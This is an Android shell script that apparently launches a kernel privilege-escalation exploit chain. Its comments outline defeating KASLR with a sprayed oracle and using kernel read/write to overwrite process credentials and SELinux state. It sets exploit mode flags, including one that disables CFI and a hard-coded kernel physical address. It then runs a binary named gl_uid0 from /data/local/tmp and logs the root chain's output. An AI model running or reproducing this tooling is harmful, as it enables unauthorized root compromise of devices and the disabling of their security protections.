#!/system/bin/sh
# Same-process JoinChang Path A minus UMH:
#   W1 sprayed SLIDE oracle -> decode KASLR
#   W2 SLIDE_SWAP HOLD (never open from this process)
# Host then runs swap_probe v4 on the live window (kR/W -> cred+selinux).
# STATIC_USERMODEHELPER_PATH="" on this build, so UMH is skipped.
export MODE4_ONLY=1
export MODE4_ROOT=1
export MODE4_SWAP_NOCFI=1
export MODE4_SWAP_HOLD=1
export KPHYS=0xa8000000
export CORE_SEL=7
export GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log
export GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt
export GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log
cd /data/local/tmp
BIN=${BIN:-/data/local/tmp/gl_uid0}
exec "$BIN" >> /data/local/tmp/rootchain.txt 2>&1
